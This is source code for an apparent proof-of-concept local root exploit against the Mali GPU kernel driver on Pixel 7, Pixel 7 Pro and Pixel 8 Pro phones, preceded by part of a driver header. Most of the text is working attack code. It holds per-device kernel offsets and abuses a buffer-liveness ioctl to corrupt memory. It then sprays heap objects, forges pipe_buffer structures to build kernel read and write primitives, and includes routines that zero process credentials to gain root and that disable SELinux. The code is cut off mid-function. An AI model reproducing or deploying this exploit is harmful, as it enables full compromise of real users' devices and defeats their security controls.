
/* Must do CPU cache maintenance when imported memory is mapped/unmapped
 * on GPU. Currently applicable to dma-buf type only.
 */
#define BASE_MEM_IMPORT_SYNC_ON_MAP_UNMAP ((base_mem_alloc_flags)1 << 26)

/* OUT */
/* Kernel side cache sync ops required */
#define BASE_MEM_KERNEL_SYNC ((base_mem_alloc_flags)1 << 28)

/* Number of bits used as flags for base memory management
 *
 * Must be kept in sync with the base_mem_alloc_flags flags
 */
#define BASE_MEM_FLAGS_NR_BITS 30

/* A mask for all output bits, excluding IN/OUT bits.
 */
#define BASE_MEM_FLAGS_OUTPUT_MASK BASE_MEM_NEED_MMAP

/* A mask for all input bits, including IN/OUT bits.
 */
#define BASE_MEM_FLAGS_INPUT_MASK                                                                  \
	(((1 << BASE_MEM_FLAGS_NR_BITS) - 1) & ~BASE_MEM_FLAGS_OUTPUT_MASK)

/* Special base mem handles.
 */
#define BASEP_MEM_INVALID_HANDLE (0ul)
#define BASE_MEM_MMU_DUMP_HANDLE (1ul << LOCAL_PAGE_SHIFT)
#define BASE_MEM_TRACE_BUFFER_HANDLE (2ul << LOCAL_PAGE_SHIFT)
#define BASE_MEM_MAP_TRACKING_HANDLE (3ul << LOCAL_PAGE_SHIFT)
#define BASEP_MEM_WRITE_ALLOC_PAGES_HANDLE (4ul << LOCAL_PAGE_SHIFT)
/* reserved handles ..-47<<PAGE_SHIFT> for future special handles */
#define BASE_MEM_COOKIE_BASE (64ul << LOCAL_PAGE_SHIFT)
#define BASE_MEM_FIRST_FREE_ADDRESS ((BITS_PER_LONG << LOCAL_PAGE_SHIFT) + BASE_MEM_COOKIE_BASE)

/* Flags to pass to ::base_context_init.
 * Flags can be ORed together to enable multiple things.
 *
 * These share the same space as BASEP_CONTEXT_FLAG_*, and so must
 * not collide with them.
 */
typedef __u32 base_context_create_flags;

/* Flags for base context */

/* No flags set */
#define BASE_CONTEXT_CREATE_FLAG_NONE ((base_context_create_flags)0)

/* Base context is embedded in a cctx object (flag used for CINSTR
 * software counter macros)
 */
#define BASE_CONTEXT_CCTX_EMBEDDED ((base_context_create_flags)1 << 0)

/* Base context is a 'System Monitor' context for Hardware counters.
 *
 * One important side effect of this is that job submission is disabled.
 */
#define BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED ((base_context_create_flags)1 << 1)

/* Bit-shift used to encode a memory group ID in base_context_create_flags
 */
#define BASEP_CONTEXT_MMU_GROUP_ID_SHIFT (3)

/* Bitmask used to encode a memory group ID in base_context_create_flags
 */
#define BASEP_CONTEXT_MMU_GROUP_ID_MASK                                                            \
	((base_context_create_flags)0xF << BASEP_CONTEXT_MMU_GROUP_ID_SHIFT)

/* Bitpattern describing the base_context_create_flags that can be
 * passed to the kernel
 */
#define BASEP_CONTEXT_CREATE_KERNEL_FLAGS                                                          \
	(BASE_CONTEXT_SYSTEM_MONITOR_SUBMIT_DISABLED | BASEP_CONTEXT_MMU_GROUP_ID_MASK)

/* Flags for base tracepoint
 */

/* Enable additional tracepoints for latency measurements (TL_ATOM_READY,
 * TL_ATOM_DONE, TL_ATOM_PRIO_CHANGE, TL_ATOM_EVENT_POST)
 */
#define BASE_TLSTREAM_ENABLE_LATENCY_TRACEPOINTS (1 << 0)

/* Indicate that job dumping is enabled. This could affect certain timers
 * to account for the performance impact.
 */
#define BASE_TLSTREAM_JOB_DUMPING_ENABLED (1 << 1)

#endif /* _UAPI_BASE_COMMON_KERNEL_H_ */

```

`poc.cpp`:

```cpp
#ifndef USE_STANDALONE
#include <jni.h>
#include <string>
#endif

#include "mali.h"

#define do_dbg(x, ...)
#define do_print(fmt, ...) do {                                         \
                __android_log_print(ANDROID_LOG_ERROR, "EXPLOIT", fmt, ##__VA_ARGS__ ); \
                printf(fmt, ##__VA_ARGS__);                             \
        } while(0)

#define PIPE_CNT_MAX (0x40 - 1)
#define PIPE_CNT_STAGE_1 (0x2)
#define PIPE_CNT_STAGE_2 (PIPE_CNT_MAX - PIPE_CNT_STAGE_1)

#define PIPE_SIZE (0x10000)

#define FAKE_PIPE_LEN (PAGE_SIZE -1)

#define pipe_rd_id(index) (pipes[index]->__fds[0])
#define pipe_wr_id(index) (pipes[index]->__fds[1])

#define NR_SLOTS_PER_PIPE (PIPE_SIZE/PAGE_SIZE)
#define NR_PAGES_SPRAY (NR_SLOTS_PER_PIPE * PIPE_CNT_STAGE_1)

#define STATIC_ADDR 0x1111110000
#define STATIC_ADDR_SZ (PAGE_SIZE * 9)

#define __pbuf      STATIC_ADDR
#define __pbuf_end (STATIC_ADDR + STATIC_ADDR_SZ)

struct pipe_struct *pipes[PIPE_CNT_MAX] = {};
#define U64_MAX		((__u64)~0ULL)
struct pipe_struct {
        int __fds[2];
        int nr_slots;
        int pipe_size;
};


void * __page_to_virt(__u64 page)
{
        return ((void*)(((((unsigned long long )page << 6) +    \
                          0xFFFFC008000000LL) & 0xFFFFFFFFFFF000LL  \
                         | 0xFF00000000000000LL)));
}

__u64 __virt_to_page(__u64 addr)
{
        return ((((__u64)(((signed long long)((__u64)(addr) << 8) >> 8) + \
                          0x8000000000LL) >> 6) & 0x3FFFFFFFFFFFFC0LL) + \
                0xFFFFFFFEFFE00000);
}

void * __page_to_virt2(__u64 page)
{
        return ((void*)(((__u64)page << 6) & 0xFFFFFFFFFFF000LL | 0xFF00000000000000LL));
}

__u64 __virt_to_page2(__u64 addr)
{
        return ((((__u64)(((signed long long)((__u64)(addr) << 8) >> 8) + \
                          0x8000000000LL) >> 12 << 6) -                 \
                 0x200000000LL));
}


struct device_config {
        const char *fingerprint;

        /* first two long values in .text section */
        __u64 __unused stext_long1;
        __u64 __unused stext_long2;

        /* kernel offset from kernel text base */
        __u64 kthread_task;
        __u64 selinux_state;
        __u64 anon_pipe_buf_ops;

        /* offset of task_struct fields */
        __u64 task_struct_cred;
        __u64 task_struct_pid;
        __u64 task_struct_tasks;
        void * (*page_to_virt_fn)(__u64);
        __u64  (* virt_to_page_fn)(__u64);
};


struct device_config dev_conf[] = {
        [0] = {                 /* Pixel 8 Pro  */
                "google/husky/husky:14/UD1A.231105.004/11010374:user/release-keys",
                0xA9027BFDD10203FF,                     // 1st 8 bytes of _stext
                0xA90467FAA9036FFC,                     // 2nd 8 bytes of _stext
                0x000000000283f200,     /* kthread_task sym_off                 */
                0x0000000002893168,     /* selinux_state sym_off                */
                0x00000000018c3770,     /* anon_pipe_buf_ops sym_off */
                0x0000000000000800,     /* offsetof task_struct->cred           */
                0x0000000000000640,     /* offsetof task_struct->pid              */
                0x0000000000000538,     /* offsetof task_struct->tasks          */
                __page_to_virt2,
                __virt_to_page2
        },
        [1] = {                  /* Pixel 7 Pro  SPL Nov-23 */
                "google/cheetah/cheetah:14/UP1A.231105.003/11010452:user/release-keys",
                0xD10203FFD503233F,     /* 1st 8 bytes of _stext                */
                0xA9027BFDF800865E,     /* 2nd 8 bytes of _stext                */
                0x00000000031308d0,     /* kthread_task sym_off                 */
                0x0000000003185970,     /* selinux_state sym_off                */
                0x000000000236cd28,     /* anon_pipe_buf_ops sym_off */
                0x0000000000000780,     /* offsetof task_struct->cred           */
                0x00000000000005c8,     /* offsetof task_struct->pid              */
                0x00000000000004c8,     /* offsetof task_struct->tasks          */
                __page_to_virt,
                __virt_to_page
        },

        [2] = {                 /* Pixel 7 Pro  SPL Oct-23 */
                "google/cheetah/cheetah:14/UP1A.231005.007/10754064:user/release-keys",
                0xAA1E03E9D503245F,     /* 1st 8 bytes of _stext                */
                0xD503233FD503201F,     /* 2nd 8 bytes of _stext                */
                0x0000000003191ed8,     /* kthread_task sym_off                 */
                0x00000000035c4030,     /* selinux_state sym_off                */
                0x000000000152ac60,     /* anon_pipe_buf_ops sym_off */
                0x0000000000000780,     /* offsetof task_struct->cred           */
                0x00000000000005c8,     /* offsetof task_struct->pid              */
                0x00000000000004c8,     /* offsetof task_struct->tasks          */
                __page_to_virt,
                __virt_to_page
        },

        [3] = {                 /* Pixel 7 */
                "google/panther/panther:14/UP1A.231105.003/11010452:user/release-keys",
                0xD10203FFD503233F,     /* 1st 8 bytes of _stext                */
                0xA9027BFDF800865E,     /* 2nd 8 bytes of _stext                */
                0x00000000031308d0,     /* kthread_task sym_off                 */
                0x0000000003185970,     /* selinux_state sym_off                */
                0x000000000236cd28,     /* anon_pipe_buf_ops sym_off */
                0x0000000000000780,     /* offsetof task_struct->cred           */
                0x00000000000005c8,     /* offsetof task_struct->pid              */
                0x00000000000004c8,     /* offsetof task_struct->tasks          */
                __page_to_virt,
                __virt_to_page
        }

};

struct device_config *conf = NULL;
struct device_config * get_device_config(void)
{
        const char* prop_name = "ro.vendor.build.fingerprint";
        char prop_value[PROP_VALUE_MAX];

        if (!__system_property_get(prop_name, prop_value)){
                do_print("Failed to read the property or property does not exist\n");
                exit(-1);
        }

        for(int i=0; i < sizeof(dev_conf)/sizeof(struct device_config);i++) {
                if (!strncmp(dev_conf[i].fingerprint, prop_value, strlen(dev_conf[i].fingerprint))) {
                        struct device_config *conf =  &dev_conf[i];
                        do_print("[+] Target device: '%s' 0x%llx 0x%llx\n",
                                 conf->fingerprint,conf->stext_long1, conf->stext_long2);
                        assert(conf->page_to_virt_fn &&       \
                               conf->virt_to_page_fn &&       \
                               conf->task_struct_tasks &&     \
                               conf->task_struct_pid &&       \
                               conf->task_struct_cred &&      \
                               conf->selinux_state &&         \
                               conf->anon_pipe_buf_ops &&     \
                               conf->kthread_task);

                        return conf;
                }

        }
        do_print("Failed to identify %s \n",prop_value);
        return NULL;
}


int open_device(const char* name) {
        int fd = open(name, O_RDWR);
        if (fd == -1) {
                perror( "cannot open %s");
                exit(1);
        }
        /* do_print("device %s opened \n",name); */
        return fd;
}

int kbase_api_handshake(int fd,struct kbase_ioctl_version_check *cmd)
{
        int ret = ioctl(fd,KBASE_IOCTL_VERSION_CHECK,cmd);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_VERSION_CHECK)");
        }
        return ret;
}

int kbase_api_set_flags(int fd, struct kbase_ioctl_set_flags *flags)
{
        int ret = ioctl(fd,KBASE_IOCTL_SET_FLAGS,flags);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_SET_FLAGS)");
        }
        return ret;
}

int kbasep_cs_queue_register(int fd , struct kbase_ioctl_cs_queue_register *q)
{
        int ret = ioctl(fd,KBASE_IOCTL_CS_QUEUE_REGISTER,q);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_CS_QUEUE_REGISTER)");
        }
        return ret;
}

int kbase_api_mem_alloc(int fd , union kbase_ioctl_mem_alloc *alloc)
{
        int ret = ioctl(fd,KBASE_IOCTL_MEM_ALLOC,alloc);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_MEM_ALLOC)");
        }
        return ret;
}

int kbasep_cs_queue_bind(int fd , union kbase_ioctl_cs_queue_bind *bind)
{
        int ret = ioctl(fd,KBASE_IOCTL_CS_QUEUE_BIND,bind);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_CS_QUEUE_BIND)");
        }
        return ret;
}

int kbasep_cs_queue_group_create(int fd , union kbase_ioctl_cs_queue_group_create *group)
{
        int ret = ioctl(fd,KBASE_IOCTL_CS_QUEUE_GROUP_CREATE,group);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_CS_QUEUE_GROUP_CREATE)");
        }
        return ret;
}

int kbase_csf_cpu_queue_dump(int fd ,struct kbase_ioctl_cs_cpu_queue_info *info)
{
        int ret = ioctl(fd,KBASE_IOCTL_CS_CPU_QUEUE_DUMP,info);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_CS_CPU_QUEUE_DUMP)");
        }
        return ret;
}

int kbasep_kcpu_queue_new(int fd)
{

        struct kbase_ioctl_kcpu_queue_new  info = {};
        int ret = ioctl(fd,KBASE_IOCTL_KCPU_QUEUE_CREATE,&info);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_KCPU_QUEUE_CREATE)");
                exit(0);
        } else {
                /* do_print("Successfully created kcpu with id = %d \n",info.id); */
                return info.id;
        }
        return ret;
}

int kbase_api_tlstream_acquire(int fd, __u32 flags)
{

        struct kbase_ioctl_tlstream_acquire data = { .flags = flags};
        int ret = ioctl(fd,KBASE_IOCTL_TLSTREAM_ACQUIRE ,&data);
        if(ret < 0 ) {
                do_print("ioctl(KBASE_IOCTL_TLSTREAM_ACQUIRE): %s",strerror(errno));
        } else {
                do_dbg("Successfully set flags and file descriptor %d\n",ret);

        }
        return ret;
}

int kbase_api_buffer_liveness_update(int fd ,struct kbase_ioctl_buffer_liveness_update *update)
{

        int ret = ioctl(fd,KBASE_IOCTL_BUFFER_LIVENESS_UPDATE,update);
        if(ret) {
                //perror("ioctl(KBASE_IOCTL_BUFFER_LIVENESS_UPDATE)");
        }
        return ret;

}

int kbasep_kcpu_queue_delete(int fd ,struct kbase_ioctl_kcpu_queue_delete *_delete)
{

        int ret = ioctl(fd,KBASE_IOCTL_KCPU_QUEUE_DELETE,_delete);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_KCPU_QUEUE_DELETE)");
        }
        return ret;

}

__u32 kbase_api_get_context_id(int fd)
{
        struct kbase_ioctl_get_context_id info = {};
        int ret = ioctl(fd,KBASE_IOCTL_GET_CONTEXT_ID,&info);
        do_dbg("kbase_api_get_context_id() id = %d\n",info.id);
        if(ret) {
                perror("ioctl(KBASE_IOCTL_GET_CONTEXT_ID)");
                exit(0);
        }
        return info.id;

}

void hexdump(const void *buffer, size_t size) {
        const unsigned char *buf = (const unsigned char *)buffer;

        size_t lineLength = 76;
        size_t totalLength = (size / 16 + (size % 16 != 0)) * lineLength;
        char *output = (char *)malloc(totalLength);
        if (!output) {
                perror("Failed to allocate memory");
                return;
        }
        output[0] = '\0'; // Initialize the output string

        char line[76]; // Temporary string to hold each line

        for (size_t i = 0; i < size; i += 16) {
                char *linePtr = line;
                for (size_t j = 0; j < 16; j++) {
                        if (i + j < size) {
                                linePtr += sprintf(linePtr, "%02X ", buf[i + j]);
                        } else {
                                linePtr += sprintf(linePtr, "   ");
                        }

                        if (j == 7) {
                                linePtr += sprintf(linePtr, " ");
                        }
                }

                linePtr += sprintf(linePtr, " | ");

                // Print ASCII values into the line buffer
                for (size_t j = 0; j < 16; j++) {
                        if (i + j < size) {
                                linePtr += sprintf(linePtr, "%c", isprint(buf[i + j]) ? buf[i + j] : '.');
                        }
                }

                sprintf(linePtr, "\n");

                // Append the line to the output string
                strcat(output, line);
        }
        do_print("%s", output); // Print the entire output string
        free(output); // Free the allocated memory
}


ssize_t pipe_structs_write(int pipe_index, void *buf,size_t bufsize);

void pipe_structs_init(size_t pipe_size, int stage)
{
        static int pipe_count = 0;
        do_dbg("Init pipe buffers ... ");
        assert(!(pipe_size % PAGE_SIZE));
        char buf[PAGE_SIZE] = {};
        memset(buf,0xe,sizeof(buf));
        buf[0] = '\x11';
        int start = 0 , end = 0;

        if( stage == 1) {
                start = 0; end = PIPE_CNT_STAGE_1;
        } else if( stage == 2) {
                start = PIPE_CNT_STAGE_1; end = PIPE_CNT_MAX;
        } else {
                assert(1==0 && "Unknown stage");
        }

        for(int i=start; i < end; i++) {
                struct pipe_struct *p = (struct pipe_struct *)calloc(1,sizeof(*p));
                pipes[i] = p;
                int ret = pipe(pipes[i]->__fds);
                if(ret) {perror("pipe()");}
                assert(ret == 0);
                pipe_count++;
                if(!pipe_size)
                        continue;

                /* Important step ... */
                ret = fcntl(pipes[i]->__fds[1],F_SETPIPE_SZ,pipe_size);
                if(ret == -1) {
                        perror("fcntl()");
                        pipes[i]->pipe_size = -1;
                        pipes[i]->nr_slots = -1;
                        exit(0);

                } else {
                        pipes[i]->pipe_size = ret;
                        pipes[i]->nr_slots = ret/PAGE_SIZE;
                        pipe_structs_write(i,buf,sizeof(buf));
                }

        }


        do_dbg("OK\n");
}


ssize_t pipe_structs_read(int pipe_index, void *buf,size_t bufsize)
{
        assert(pipe_index < PIPE_CNT_MAX);

        if(pipes[pipe_index]->pipe_size == -1) {
                do_print("pipe struct is empty\n");
                return -1;
        }
        ssize_t rb = read(pipes[pipe_index]->__fds[0],buf,bufsize);
        return rb;

}

// Read data from pipe without updating pipe_buffer->len/offset
void pipe_struct_read_with_guard(int pipe_index, void *buffer,size_t bufsize)
{
        bzero(buffer,bufsize);

        __u8 *ptr = (__u8 *)__pbuf_end - bufsize;
        bzero(ptr, bufsize);
        ssize_t rb = pipe_structs_read(pipe_index, ptr, bufsize+1); // +1 will trigger EFAULT in copy_page_to_iter
        /* We must EFAULT, otherwise it's a failure */
        assert((rb < 0) && errno == EFAULT);

        memcpy(buffer, ptr,bufsize);
}


ssize_t pipe_structs_write(int pipe_index, void *buf,size_t bufsize)
{
        assert(pipe_index < PIPE_CNT_MAX);

        if(pipes[pipe_index]->pipe_size == -1) {
                do_print("pipe struct is freed\n");
                return -1;
        }
        ssize_t wb = write(pipes[pipe_index]->__fds[1],buf,bufsize);

        return wb;

}

void pipe_struct_write_with_guard(int pipe_index, void *buffer,size_t bufsize)
{
        __u8 *ptr = (__u8 *)__pbuf_end - bufsize;
        memcpy(ptr,buffer,bufsize);
        ssize_t wb = pipe_structs_write(pipe_index, ptr, bufsize + 1); // +1 will trigger EFAULT in copy_page_to_iter
        /* We must EFAULT, otherwise it's a failure */
        assert((wb < 0) && errno == EFAULT);

}

void pipe_struct_free(int pipe_index)
{
        assert(pipe_index < PIPE_CNT_MAX);

        assert(!close(pipes[pipe_index]->__fds[0]));
        assert(!close(pipes[pipe_index]->__fds[1]));
        pipes[pipe_index]->pipe_size = -1;
}


void init_buffers()
{
        void *p = mmap((void*)0x1111110000,STATIC_ADDR_SZ,
                       PROT_READ|PROT_WRITE,MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
        if(p == MAP_FAILED) assert(1 == 0);

        /* guard page */
        void *pg = mmap((void *)(0x1111110000 + STATIC_ADDR_SZ),
                        PAGE_SIZE,PROT_NONE,MAP_ANONYMOUS | MAP_PRIVATE,-1,0);
        if(pg == MAP_FAILED) assert(1 == 0);
        return;


}

struct kcpu_args {
        int fd;
        int streamfd;
        __u32 kcpu_id;
        __u32 kctx_id;
        __u64 kcpu_kaddr;
};

void fd_limit_up()
{
        struct rlimit lim = {};
        if(getrlimit(RLIMIT_NOFILE, &lim)) {
                perror("getrlimit");
                exit(-1);
        }
        lim.rlim_cur = lim.rlim_max;

        if(setrlimit(RLIMIT_NOFILE, &lim)){
                perror("setrlimit");
                exit(-1);
        }
}

__u64 get_kcpu_kaddr(struct kcpu_args *args)
{
#define KBASE_TL_KBASE_NEW_KCPUQUEUE 59

        struct kcpu_args *ta = args;

        char buf[0x1000] = {};
        ssize_t rb = 0;
        do {
                rb = read(ta->streamfd,buf,sizeof(buf));
                char *p = buf;
                for(ssize_t i=0; i < rb && rb > 0x24; i++, p++) {
                        __u32 msg_id =  *(__u32 *)(p );
                        __u32 id =  *(__u32 *)(p + (32 - 12));  /* kcpu_queue_id */
                        __u32 kid =  *(__u32 *)(p + (36 - 12)); /* kernel_ctx_id */

                        if((msg_id == KBASE_TL_KBASE_NEW_KCPUQUEUE) && (id == ta->kcpu_id) \
                           && (kid == (ta->kctx_id ))) {
                                __u64 kcpu_queue = *(__u64 *)(p + (24 - 12));
                                return kcpu_queue;
                        }

                }

        } while((rb >= 0) &&  ta->kcpu_kaddr  == 0);

        return 0;
}



/* fake pipe buffer */
struct pipe_buffer {
        __u64 page;
        unsigned int offset, len;
        const void *ops;
        unsigned int flags;
        unsigned long _private;
};

struct pipe_rw {
        int wr;
        int krw_idx;        /* Used to manipulate pipe_buffer content */
        int krd_idx;
        __u64 anon_pipe_buf_ops;
        __u64 kthreadd_task;
        __u64 kernel_base;
        __u64 selinux_state;
        __u64 my_task;
        __u8 rwbuf[PAGE_SIZE];
        struct pipe_buffer pb;
};

struct pipe_rw prw = {};
#define kwrite(addr,sz) (pipe_struct_write_with_guard(prw.krw_idx, (addr), sz))
#define kread(addr,sz) (pipe_struct_read_with_guard(prw.krd_idx ,prw.rwbuf,sz))

#define kread64(addr) ( do {                            \
                        kread(addr,8);                  \
                        __u64 value = 0;                \
                        value = *(__u64 *)(prw.rwbuf);  \
                }while(0);)

#define update_pipe_buffer pipe_struct_write_with_guard
#define fetch_pipe_buffer pipe_struct_read_with_guard


static __u64 kernel_read64(__u64 addr)
{
        __u64 kaddr_align = addr & ~(PAGE_SIZE - 1);

        struct pipe_buffer *pb = &prw.pb;

        pb->page = conf->virt_to_page_fn((__u64)kaddr_align);
        pb->offset = addr & (PAGE_SIZE - 1);
        pb->len = 0x20 + 1; // +1 to produce page fault, thefore writing to pipe buffer wihout updating len/offset

#if 0
        do_print("fake pipe_buffer {.page = 0x%llx, .offset = 0x%x, .len = 0x%x, ops = 0x%llx}\n",
                 pb->page,pb->offset,pb->len,(__u64)pb->ops);
#endif
        update_pipe_buffer(prw.krw_idx, pb, 0x28);

        /* Let's check the write */
        fetch_pipe_buffer(prw.krd_idx ,prw.rwbuf,0x28);
        if (*(__u64 *)prw.rwbuf != pb->page) {
                do_print("ERROR 0x%llx 0x%llx \n",*(__u64 *)prw.rwbuf,pb->page);
                getchar();
        }

        pipe_structs_read(prw.wr, prw.rwbuf, 0x20);

        return *(__u64 *)prw.rwbuf;

}


void kernel_write(__u64 addr,__u8 *buf,size_t size)
{
        __u64 kaddr_align = addr & ~(PAGE_SIZE - 1);

        struct pipe_buffer *pb = &prw.pb;

        /* pb->page = virt_to_page((__u64)kaddr_align); */
        pb->page = conf->virt_to_page_fn((__u64)kaddr_align);

        pb->offset = addr & (PAGE_SIZE - 1);
        pb->len = 0; // Start writing at offset = 0

#if 0
        do_print("Writing to 0x%llx \n",addr);
        do_print("fake pipe_buffer {.page = 0x%llx, .offset = 0x%x, .len = 0x%x, ops = 0x%llx}\n",
                 pb->page,pb->offset,pb->len,(__u64)pb->ops);
#endif

        update_pipe_buffer(prw.krw_idx, pb, 0x28);

        /* Let's check the write */
        fetch_pipe_buffer(prw.krd_idx ,prw.rwbuf,0x28);
        //hexdump(prw.rwbuf, 0x28);
        if (*(__u64 *)prw.rwbuf != pb->page) {
                do_print("ERROR 0x%llx 0x%llx \n",*(__u64 *)prw.rwbuf,pb->page);
                getchar();
        }

        //do_print("before 0x%llx \n",kernel_read64(addr));
        //hexdump(prw.rwbuf, 0x20);
        ssize_t wr = pipe_structs_write(prw.wr, buf, size);
        assert(wr == size);

}


void get_root()
{
        __u64 creds = kernel_read64(prw.my_task + conf->task_struct_cred);

        //do_print("OLD PRIVs: getuid() = %d getgid() = %d \n",getuid(),getgid());
        __u8 buf[0x20] = {};
        memset(buf,0,sizeof(buf));
        kernel_write((__u64)(creds + 4),buf,sizeof(buf));

        do_print("[+] Successfully got root: getuid() = %d getgid() = %d \n",getuid(),getgid());


}

void disable_selinux()
{
        int enabled = kernel_read64(prw.selinux_state);
        __u32 value = (enabled >> 1) << 1;

        kernel_write(prw.selinux_state,(__u8 *) &value, 4);
        enabled = kernel_read64(prw.selinux_state);
        if(!(enabled & 1))
                do_print("[+] Successfully disabled SELinux \n");

}

__u64 get_current_task()
{
        assert(conf != NULL);

        __u64 curr_tsk = prw.kthreadd_task;
        __u64 my_task = 0;
        do {

                __u8 *ptr = prw.rwbuf;

                pid_t pid = (__u32)kernel_read64(curr_tsk + conf->task_struct_pid);
                pid_t gid = (__u32)kernel_read64(curr_tsk + conf->task_struct_pid + 4);

                if(pid == getpid() ) {
                        do_print("[+] Found our own task struct 0x%llx \n",curr_tsk);
                        my_task = curr_tsk;
                        break;
                }
                curr_tsk = kernel_read64(curr_tsk + conf->task_struct_tasks) - conf->task_struct_tasks;
                usleep(1000);

        } while ((curr_tsk != prw.kthreadd_task) || !curr_tsk);
        if(my_task) {
                prw.my_task = my_task;
                return my_task;
        }
        return 0;
}

#ifdef __cplusplus
extern "C"
#endif
int mali_exploit(void)
{
        int err = 0;

        conf = get_device_config();
        if(!conf)
                return -1;

        /* getchar(); */
        fd_limit_up();

        int fd = open_device("/dev/mali0");

        struct kbase_ioctl_version_check cmd = {.major = 1, .minor = -1};
        kbase_api_handshake(fd, &cmd);
        struct kbase_ioctl_set_flags flags = {0};
        kbase_api_set_flags(fd,&flags);

        struct kbase_ioctl_buffer_liveness_update u = {};

        size_t ss = 0x40000000;
        /* __u64 lll = (__u64)malloc(ss); */

        /* Allocate the buffer that we'll use as live_ranges */
        init_buffers();
        __u32 write_size = 0x8000;//0x100;

        memset((void*)0x1111110000,0,STATIC_ADDR_SZ);
        __u8 *ptr = (__u8 *)(0x1111110000 + STATIC_ADDR_SZ - write_size);

        struct kcpu_args *ta = (struct kcpu_args *)calloc(sizeof(*ta),1);
        ta->fd = fd;

        ta->streamfd = kbase_api_tlstream_acquire(ta->fd,BASE_TLSTREAM_ENABLE_CSF_TRACEPOINTS);
        if(ta->streamfd < 0) assert(1 == 0 && "Unable to have tlstream fd");

        ta->kctx_id = kbase_api_get_context_id(ta->fd);
        ta->kcpu_id =   kbasep_kcpu_queue_new(ta->fd);
        ta->kcpu_kaddr = get_kcpu_kaddr(ta);
        do_print("[+] Got the kcpu_id (%d) kernel address = 0x%llx  from context (0x%x)\n",
                 ta->kcpu_id,ta->kcpu_kaddr,ta->kcpu_id);


#define PIPE_BUF_FLAG_CAN_MERGE	0x10	/* can merge buffers */

        assert(STATIC_ADDR_SZ > (0x4000 * 2));

        struct pipe_buffer *p = (struct pipe_buffer *)ptr;

        p->page = conf->virt_to_page_fn(ta->kcpu_kaddr);
        p->offset = 0;
        p->len = FAKE_PIPE_LEN;

        // pipe_buf_get() will crash the kernel because p->ops must not be NULL
        // and the first 8 bytes of the leaked kcpu_address are always 0's
#if 0
        p->ops = (const void *)(0x1122334455667700 | i);
#else
        p->ops = (const void *)(ta->kcpu_kaddr + 0x50);
#endif

        p->flags = PIPE_BUF_FLAG_CAN_MERGE;
        p->_private = 0;

        p = (struct pipe_buffer *)( ptr + 0x4000);
        p->page = conf->virt_to_page_fn(ta->kcpu_kaddr);
        p->offset = 0;
        p->len = 0;             /* This is the starting position of the pipe_write */
        p->ops = (const void *)(ta->kcpu_kaddr + 0x50);
        p->flags = PIPE_BUF_FLAG_CAN_MERGE;
        p->_private = 0;


        u.live_ranges_address = (__u64)ptr;
        u.buffer_va_address =  (__u64)-1;       /* no need */
        u.buffer_sizes_address = (__u64)-1;     /* no need */


        size_t psize =  (0x100) * PAGE_SIZE;

        /* Do not resize the pipe buffer now, let's do it later after the kcpu has been freed */
        pipe_structs_init(0,2);

//#define FDS 40
#define FDS 100
#define KBASEP_MAX_KCPU_QUEUES ((size_t)256)

        int mfds[FDS + 1]  = {};
        __u32 kcpu_ids[FDS +1 ][KBASEP_MAX_KCPU_QUEUES] = {};
        for(int i = 0; i < FDS;i++) {
                int ffd = open_device("/dev/mali0");
                mfds[i] = ffd;
                struct kbase_ioctl_version_check cmd = {.major = 1, .minor = -1};
                kbase_api_handshake(ffd, &cmd);
                struct kbase_ioctl_set_flags flags = {0};
                kbase_api_set_flags(ffd,&flags);
        }

        /* Spray with page order 2 allocations to make the upcoming allocations
           more predictable
        */
        for(int i = 0; i < FDS;i++) {
                for(int j=0; j < KBASEP_MAX_KCPU_QUEUES ;j++)
                        kcpu_ids[i][j] = kbasep_kcpu_queue_new(mfds[i]);
        }

        for(int i=0; i < (255 -1 );i++)
                kcpu_ids[FDS][i] = kbasep_kcpu_queue_new(ta->fd);



        struct kcpu_args kcpu = {
                .kcpu_id = kcpu_ids[FDS-1][KBASEP_MAX_KCPU_QUEUES -1], // take the last kcpu kernel address
                .streamfd = ta->streamfd,
                .kctx_id = kbase_api_get_context_id(mfds[FDS - 1 ]),
        };

        kcpu.kcpu_kaddr =  get_kcpu_kaddr(&kcpu);
        do_print("[+] Got the kcpu_id (%d) kernel address = 0x%llx  from context (0x%x)\n",
                 kcpu.kcpu_id,kcpu.kcpu_kaddr,kcpu.kcpu_id);

        pipe_structs_init(psize,1);

        int fake_pipe_index = -1;
        __s64 off = 0x4000;
        __u64 size = 0x1c01;

        off = 0x8000;
        size = 0x2c01;

        __u64 buffer_info_size = 0;
        __u64 live_ranges_size = 0;


        u.buffer_count =  (__u64)(-off/0x10);
        u.live_ranges_count = size;

        buffer_info_size = sizeof(__u64) * u.buffer_count;
        live_ranges_size = sizeof(struct kbase_pixel_gpu_slc_liveness_mark) * u.live_ranges_count;
        __u64 total_buff_size = buffer_info_size * 2 + live_ranges_size;

        /* to write at offset=0x100 you need lives_ranges=0x1ffd9 total_size will be = 0x7fe64 */
        //do_print("The allocation size will be 0x%llx \n",total_buff_size);
        //do_print("buffer_count = 0x%llx live_ranges_count= 0x%llx \n",u.buffer_count, u.live_ranges_count);
        err = kbase_api_buffer_liveness_update(fd,&u);

        for(int i=0; i < PIPE_CNT_STAGE_1; i++) {
                int sz = 0;
                err = ioctl(pipes[i]->__fds[0],FIONREAD,&sz);
                assert(err == 0);
                if(sz != FAKE_PIPE_LEN)
                        continue;
                do_print("[+] Found corrupted pipe with size 0x%x \n",sz);
                fake_pipe_index = i;
                break;
        }

        if(fake_pipe_index == -1) {
                do_print("[-] Failed to get the fake pipe_buffer \n");
                exit(0);
        }

        do_print("[+] SUCCESS! we have a fake pipe_buffer (%d)!\n",fake_pipe_index);
        __u8 rwbuf[FAKE_PIPE_LEN-1] = {};

        /* Read kcpuqueue object content */
        pipe_struct_read_with_guard(fake_pipe_index ,rwbuf,sizeof(rwbuf));
        hexdump(rwbuf + 0x10,0x40);
        __u64 mtx_next = *(__u64 *)(rwbuf + 0x10);
        __u64 kctx = *(__u64 *)(rwbuf + 0x30);


        /* Nothing ... just a another sleep variant */
        for(int i=0; i < 100;i++) {
                pipe_struct_read_with_guard(fake_pipe_index ,rwbuf,sizeof(rwbuf));

        }

